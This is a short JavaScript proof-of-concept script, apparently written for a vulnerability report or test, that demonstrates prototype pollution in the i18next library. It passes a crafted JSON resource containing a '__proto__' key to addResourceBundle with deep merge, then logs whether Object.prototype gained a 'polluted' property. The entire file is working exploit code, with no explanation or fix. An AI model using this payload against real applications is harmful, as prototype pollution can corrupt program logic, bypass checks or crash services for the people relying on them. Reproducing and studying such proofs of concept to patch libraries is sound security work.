var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const i18next = require('i18next');
const translations = '{ "__proto__": { "polluted": "yes"} }';
const existingData = {};
i18next.init({
    lng: 'en',
    resources: {}
});
console.log({}.polluted);
i18next.addResourceBundle('en', 'translation', JSON.parse(translations), true, true);
console.log({}.polluted);